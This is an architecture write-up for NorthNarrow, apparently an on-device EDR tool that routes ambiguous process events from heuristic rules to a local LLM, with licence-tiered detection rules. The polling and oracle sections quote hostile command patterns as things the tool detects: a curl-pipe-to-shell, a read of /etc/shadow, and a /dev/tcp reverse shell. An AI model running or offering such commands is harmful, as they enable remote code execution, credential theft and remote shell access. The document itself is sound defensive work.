# NorthNarrow — Architecture Deep Dive

This document explains the architectural decisions behind NorthNarrow
and the reasoning that led to its current design.

---

## Design Principles

NorthNarrow is built around three non-negotiable principles:

1. **Sovereignty first** — no telemetry leaves the protected perimeter
2. **Determinism + intelligence** — combine sub-millisecond rules with
   probabilistic AI reasoning, never replace one with the other
3. **Single binary, feature-flagged** — one artifact ships everywhere,
   commercial tiers are unlocked via signed license tokens

---

## The Cascading Oracle

The most distinctive architectural choice in NorthNarrow is the **Cascading
Oracle**: a two-stage verdict pipeline that combines deterministic
heuristics with local LLM reasoning.

### Why two engines?

Modern EDR products typically choose one path:
- **Pure rules**: fast, deterministic, but blind to novel patterns
- **Pure ML**: handles novelty but black-box, hard to audit
- **Cloud ML**: best detection quality but breaks data sovereignty

NorthNarrow chose a **hybrid local approach**: heuristic rules handle the
known patterns at sub-millisecond latency, and the LLM handles the
ambiguous cases that fall in the middle.

### The flow

ProcessMonitor emits an event (1 process per ~100ms)
CorrelationEngine batches events into per-host sliding windows
CascadingOracle receives a batch and:
a) HeuristicOracle evaluates against 100 rules (~1ms total)

score >= 0.85: deterministic verdict, NO AI inference
score <= 0.15: deterministic clean, NO AI inference
0.15 < score < 0.85: AMBIGUOUS, escalate to LocalOracle
b) LocalOracle (Gemma 4 E4B via llama.cpp) reasons about context:
process tree, command line, parent, working directory
returns its own score + reasoning + threat name
c) Final verdict: weighted merge of heuristic + AI


ResponseEngine acts proportionally (LOG → ALERT → THROTTLE → KILL → ISOLATE)
Audit log captures BOTH verdicts (heuristic + AI) for traceability


### Why this works

**Determinism for the obvious**: a process named `xmrig` mining on a
production server is a 0.95 score deterministically. No AI needed.
Sub-millisecond verdict.

**AI for the ambiguous**: a process running `bash -c 'curl ... | sh'`
with score 0.55 (suspicious but not certain) escalates to the LLM,
which considers the process tree, parent, working directory, and
returns enriched context.

**Graceful degradation**: if the LLM server is unreachable, the
HeuristicOracle continues alone. NorthNarrow never goes "blind".

---

## Why Local LLM (Gemma 4 E4B)

The choice of running an LLM **on-device** instead of via cloud API
is the single biggest differentiator from CrowdStrike, SentinelOne,
Darktrace, and similar products.

### Trade-offs we accepted

| Aspect | Cloud LLM | Local LLM (NorthNarrow) |
|--------|-----------|-------------------|
| Latency | 200ms–2s | 7–15s on CPU |
| Quality | GPT-4 class | Gemma 4 (smaller) |
| Cost | $0.001–0.01/event | RAM only |
| Data sovereignty | ❌ leaves perimeter | ✅ stays local |
| Air-gapped support | ❌ impossible | ✅ first-class |
| Vendor lock-in | High | None |

For environments where **sovereignty is non-negotiable** (banking,
defense, healthcare, regulated EU markets), the latency trade-off
is acceptable. For environments where it isn't, NorthNarrow isn't the
right tool — and that's fine.

### Why Gemma 4 E4B specifically

After benchmarking Qwen3-4B, Gemma 4 E4B (Q8 quantization), and a few
others on identical Linux process classification tasks:

- **Quality**: Gemma showed better adherence to JSON schema constraints
  and more consistent MITRE technique mapping
- **Speed**: ~5–6 tok/s on Ryzen 9 3900XT (no GPU), comparable to Qwen3
- **License**: Gemma terms are permissive enough for commercial integration
- **Size**: ~8 GB RAM, fits comfortably alongside the agent

The LLM is **not the only AI choice possible**. The architecture is
abstract enough (`Oracle` trait) that swapping models is a config change.

---

## Tier-Aware Knowledge Base

Inspired by GitLab and Elastic, NorthNarrow uses a single binary with
feature-flagged commercial tiers.

### How it works

Every detection rule has a `tier` field:

```rust
DetectionRule {
    id: "NEX-L-BIZ-001",
    name: "Kubernetes pod escape",
    tier: RuleTier::Business,    // ← gate for commercial licenses
    os: vec![RuleOs::Linux],
    // ... conditions, score, MITRE mapping
}
```

At boot, the agent loads the **license tier** from a signed file and
filters the KB:

```rust
let active_rules = kb.filter_by_tier(license.tier);
```

The `RuleTier` enum implements `includes()`: a Pro license sees Free
+ Pro rules; an Enterprise license sees everything. Rules above the
licensed tier are **never loaded into memory** — they're effectively
invisible to the running agent.

### Why this matters

- **Single binary** to maintain, build, ship, document, support
- **Cryptographic gating** (Ed25519-signed license, planned M12)
- **Clear upgrade path** for customers (more value at higher tiers)
- **Open core friendly**: Free tier can be AGPLv3 once code is public

### Current tier distribution (v0.3.0)

| Tier | Rules | Coverage |
|------|------:|----------|
| Free | 54 | Common malware, ransomware, scripting attacks |
| Pro | 21 | Supply chain, advanced detection, evasion |
| Business | 16 | Server, container, cloud security |
| Enterprise | 9 | APT-tier, kernel-level, advanced rootkits |
| **Total** | **100** | |

---

## Process Telemetry: Polling Today, eBPF Tomorrow

The current implementation uses `sysinfo` polling at 10 Hz. This is
**deliberately suboptimal**, and we're transparent about why.

### Why polling first?

Milestones 1–9 prioritized **architecture validation** over telemetry
perfection. The polling approach demonstrated end-to-end that:

- The Cascading Oracle pattern works (heuristic + AI integration)
- Tier-aware filtering correctly gates rules
- Zero false positives are achievable with curated rules
- The pipeline handles real workloads without drops

With those proven, we can now invest in eBPF without architectural risk.

### What polling can't do

- **Sub-100ms processes are missed**: a `cat /etc/shadow` lasting 5ms
  often falls between two polling intervals
- **Post-execve() command line**: `bash -c "sleep 5"` is captured as
  `sleep 5` after the exec replaces the bash image. Original shell
  expression is lost
- **Bash redirections** in `/proc/<pid>/cmdline` are partial: `bash -i
  >& /dev/tcp/host/port 0>&1` doesn't show the redirection

These limitations are **fundamental to userspace polling**, not a
NorthNarrow-specific bug.

### Milestone 10: eBPF kernel telemetry

The `aya` crate (pure Rust eBPF) intercepts `execve()` at the syscall
level **before** exec replaces the process image. This captures:

- Original command line as invoked by the parent shell
- Parent process ID and command line (for chain-of-trust)
- Sub-millisecond detection latency
- Syscall-level visibility (`connect`, `openat`, `clone`, `ptrace`)

This brings NorthNarrow in line with industry-standard EDR tools (Falco,
CrowdStrike Falcon Linux sensor, Sysdig Secure) which all use eBPF.

---

## Future: P2P Mesh for Multi-Host Coordination

The current design is **per-host**. NorthNarrow agents on different machines
operate independently, with no inter-agent communication.

A P2P mesh layer is planned (no crate allocated yet — design will start when
concrete requirements from a deployment partner emerge):

- **mDNS peer discovery** on the local network (no central server)
- **Ed25519-signed beacons** for IoC propagation between peers
- **Quorum-based KB updates**: a new rule is trusted only if multiple
  peers have validated it
- **Air-gapped P2P**: works on isolated networks without internet

This is the **commercial differentiator** vs Wazuh/Falco, which require
central management servers (and therefore breach air-gapped requirements).

---

## What NorthNarrow Deliberately Doesn't Do

To stay focused, NorthNarrow explicitly declines several common EDR features:

- ❌ **Cloud telemetry aggregation** — all analysis stays local
- ❌ **External threat feeds** — KB is signed by NorthNarrow team only (M12)
- ❌ **Auto-update from internet** — air-gapped operation requires
  manual KB updates via signed feed files
- ❌ **macOS support** (for now) — small market, requires Apple ESF
  + paid certificates, deferred until Linux + Windows are mature
- ❌ **Mobile endpoints** (Android/iOS) — out of scope

These are not "missing features" — they are **architectural choices**
that align with the sovereignty-first principle.

---

*This document evolves with the project. For the latest, see the
[CHANGELOG](../CHANGELOG.md) and [main README](../README.md).*
